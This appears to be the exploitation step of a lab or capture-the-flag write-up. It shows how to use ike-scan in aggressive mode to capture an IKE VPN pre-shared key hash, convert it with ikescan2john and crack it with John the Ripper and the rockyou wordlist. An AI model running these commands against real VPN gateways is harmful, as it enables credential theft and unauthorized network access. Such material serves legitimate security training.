# Exploitation
Since aggressive mode is enabled, use ike-scan to grab the pre-shared key (PSK) hash.
```
ike-scan -A --pskcrack <ip>
```
Save the hash in hash.txt and used ikescan2john to convert the hash into a readable hash by john
```
ikescan2john hash.txt
```
Save the new hash into pskjohn.txt and use the following command to crack the hash
```
john --wordlist=/usr/share/wordlists/rockyou.txt pskjohn.txt 
```
